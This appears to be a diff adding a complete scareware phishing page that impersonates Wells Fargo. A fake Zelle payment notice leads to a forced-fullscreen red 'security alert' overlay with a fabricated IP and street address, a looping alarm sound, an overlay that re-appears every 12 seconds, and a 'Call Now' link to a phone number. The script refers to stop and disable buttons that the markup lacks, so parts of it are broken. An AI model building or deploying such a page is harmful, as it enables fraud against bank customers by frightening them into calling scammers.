@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>WELLS FARGO</title>
+<style>
+  html,body { height:100%; margin:0; font-family:Arial,Helvetica,sans-serif; background:#111; color:#fff; }
+  .center {
+    height:100vh; display:flex; align-items:center; justify-content:center; flex-direction:column;
+  }
+  button { padding:12px 18px; font-size:16px; border-radius:8px; border:none; cursor:pointer; }
+  .start { background:#ffcc00; color:#111; }
+  .note { margin-top:12px; color:#ccc; font-size:14px; max-width:720px; text-align:center; }
+  /* overlay that simulates freeze */
+  #overlay {
+    position:fixed; inset:0; background:rgba(200,0,0,0.95); z-index:9999;
+    display:none; align-items:center; justify-content:center; flex-direction:column;
+    text-align:center; padding:20px; box-sizing:border-box;
+  }
+  #overlay h1 { font-size:36px; color:yellow; margin:0 0 10px; text-shadow:0 2px 6px rgba(0,0,0,0.6);}
+  #overlay p { font-size:18px; color:#fff; margin:6px 0; }
+  .big-btn { margin-top:18px; padding:12px 22px; font-size:18px; border-radius:10px; border:none; cursor:pointer; }
+  .stop { background:#222; color:#fff; border:2px solid #fff; }
+  .disable { background:#fff; color:#c00; margin-left:12px; }
+  /* subtle re-show timer indicator */
+  .timer { margin-top:8px; color:#ffe; font-size:13px; opacity:0.9; }
+</style>
+</head>
+<body>
+  <div class="center">
+    <button id="startBtn" class="start">CLICK HERE TO SIGN IN YOUR BANK </button>
+    <div class="note">
+      A Zelle of $798.56 has been initiated from your checking account. Sign in your bank to cancel or review this transaction.
+    </div>
+  </div>
+
+  <!-- Overlay that looks like a locked screen -->
+  <div id="overlay" role="dialog" aria-modal="true">
+    <h1>🚨 SECURITY ALERT — Your personal data,banking information and web login credentials saved on this device are at risk due to a major security breach! 🚨</h1>
+    <p>Address IP: 192.168.54.543</p>
+    <p>Location: 4134 Myra Street, North Kingstown, Rhode Island — Alert level: SEVERE</p>
+    <div>
+    <h2>Click to Call</h2>
+    <!-- Replace the number with your desired phone number -->
+    <a href="tel:+18053928812" class="call-btn">📞 Call Now</a>
+    </div>
+    <div class="timer" id="timerText">Next scan in: —</div>
+  </div>
+
+  <!-- audio - can be replaced with local file if preferred -->
+  <audio id="alertSound" loop>
+    <source src="https://actions.google.com/sounds/v1/alarms/beep_short_alerts.ogg" type="audio/ogg">
+    <source src="https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg" type="audio/ogg">
+  </audio>
+
+<script>
+(function(){
+  const overlay = document.getElementById('overlay');
+  const startBtn = document.getElementById('startBtn');
+  const stopBtn = document.getElementById('stopBtn');
+  const disableBtn = document.getElementById('disableBtn');
+  const alertSound = document.getElementById('alertSound');
+  const timerText = document.getElementById('timerText');
+
+  // configuration (safe, in-session only)
+  let repeatIntervalSec = 12; // how often overlay reappears (seconds)
+  let repeatTimer = null;
+  let repeatEnabled = true;
+
+  function showOverlay(){
+    overlay.style.display = 'flex';
+    // start sound if allowed
+    try { alertSound.play().catch(()=>{}); } catch(e){}
+  }
+
+  function hideOverlay(){
+    overlay.style.display = 'none';
+    try { alertSound.pause(); alertSound.currentTime = 0; } catch(e){}
+  }
+
+  function startRepeatCycle(){
+    clearInterval(repeatTimer);
+    let countdown = repeatIntervalSec;
+    timerText.textContent = `Next re-show in: ${countdown}s (repeat enabled)`;
+    repeatTimer = setInterval(()=>{
+      countdown--;
+      if(countdown <= 0){
+        if(repeatEnabled){
+          showOverlay();
+        }
+        countdown = repeatIntervalSec;
+      }
+      timerText.textContent = `Next re-show in: ${countdown}s ${repeatEnabled ? '(repeat enabled)' : '(repeat disabled)'}`;
+    }, 1000);
+  }
+
+  startBtn.addEventListener('click', async function(){
+    // request fullscreen on user gesture for stronger effect (user may press Esc to exit)
+    try {
+      if(document.documentElement.requestFullscreen){
+        await document.documentElement.requestFullscreen();
+      }
+    } catch(e){ /* ignore if fullscreen blocked */ }
+
+    // show overlay now
+    showOverlay();
+
+    // start the repeat cycle
+    repeatEnabled = true;
+    startRepeatCycle();
+
+    // optionally hide the start UI
+    startBtn.disabled = true;
+    startBtn.textContent = 'CALL IMMEDIATELY';
+  });
+
+  stopBtn.addEventListener('click', function(){
+    // stop everything and allow user back to normal
+    repeatEnabled = false;
+    clearInterval(repeatTimer);
+    hideOverlay();
+    // exit fullscreen if active (user may also press Esc)
+    if(document.fullscreenElement){
+      document.exitFullscreen().catch(()=>{});
+    }
+    startBtn.disabled = false;
+    startBtn.textContent = 'CLICK HERE TO SIGN IN YOUR BANK)';
+    timerText.textContent = 'Repeat disabled.';
+  });
+
+  disableBtn.addEventListener('click', function(){
+    repeatEnabled = false;
+    timerText.textContent = 'Repeat disabled. Overlay will not re-show automatically.';
+    disableBtn.disabled = true;
+    disableBtn.textContent = 'Repeat Disabled';
+  });
+
+  // prevent accidental page scrolling while overlay shown
+  document.addEventListener('wheel', function(e){
+    if(overlay.style.display === 'flex') e.preventDefault();
+  }, { passive: false });
+
+  // Allow Escape key to close overlay (standard browser behavior also exits fullscreen)
+  document.addEventListener('keydown', function(e){
+    if(e.key === 'Escape' && overlay.style.display === 'flex'){
+      stopBtn.click(); // act as safe stop
+    }
+  });
+
+  // Ensure audio is paused when page is unloaded
+  window.addEventListener('beforeunload', function(){ try{ alertSound.pause(); }catch(e){} });
+})();
+</script>
+</body>
+</html>
